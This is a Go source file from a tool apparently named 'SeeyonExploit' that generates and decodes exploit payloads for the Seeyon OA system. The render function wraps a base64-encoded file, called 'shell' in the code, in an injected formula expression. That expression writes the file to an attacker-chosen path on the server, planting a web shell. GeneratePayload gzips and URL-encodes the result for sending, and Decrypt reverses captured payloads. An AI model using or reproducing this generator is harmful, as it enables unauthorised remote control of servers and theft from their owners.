package DecAndGen

import (
	"SeeyonExploit/utils"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"golang.org/x/text/encoding/charmap"
	"io/ioutil"
	"net/url"
	"os"
	"strings"
)

type Conf struct {
	Enc  string
	Name string
	Path string
}

func render(enc string, name string, path string) string {
	conf := Conf{enc, name, path}
	payload := `
[{'formulaType': 1, 'formulaName': 'test', 'formulaExpression': 'String path = "{{.Path}}";
       	java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"{{.Name}}");
        String shell = "{{.Enc}}"
        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
        String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");
        printWriter2.println(decodeString);
        printWriter2.close();};test();def static xxx(){'}, '', {}, 'true']
`

	return utils.Render(conf, payload)
}

func Decrypt(s string, out string) {
	if !strings.Contains(s, "%1F%C2%8B") {
		fil, err := os.Open(s)
		utils.PanicErr(err)
		defer fil.Close()
		content, err := ioutil.ReadAll(fil)
		utils.PanicErr(err)
		s = string(content)
	}
	unescape, _ := url.QueryUnescape(s)
	latin1, err := charmap.ISO8859_1.NewEncoder().String(unescape)
	utils.PanicErr(err)
	reader, err := gzip.NewReader(bytes.NewBufferString(latin1))
	utils.PanicErr(err)
	code, _ := ioutil.ReadAll(reader)
	if out != "" {
		err := ioutil.WriteFile(out, code, 0644)
		utils.PanicErr(err)
	} else {
		fmt.Println(string(code))
	}
}
func GeneratePayload(file string, name string, path string, out string) {
	fil, err := os.Open(file)
	utils.PanicErr(err)
	defer fil.Close()
	content, err := ioutil.ReadAll(fil)
	enc := string(content)
	if enc != "" {
		enc = base64.StdEncoding.EncodeToString([]byte(enc))
		data := render(enc, name, path)
		var in bytes.Buffer
		w := gzip.NewWriter(&in)
		w.Write([]byte(data))
		w.Close()
		//fmt.Println(in.String())
		dec, err := charmap.ISO8859_1.NewDecoder().String(in.String())
		utils.PanicErr(err)
		escape := url.QueryEscape(dec)
		if out != "" {
			err := ioutil.WriteFile(out, []byte(escape), 0644)
			utils.PanicErr(err)
		} else {
			fmt.Println(escape)
		}
	}
}
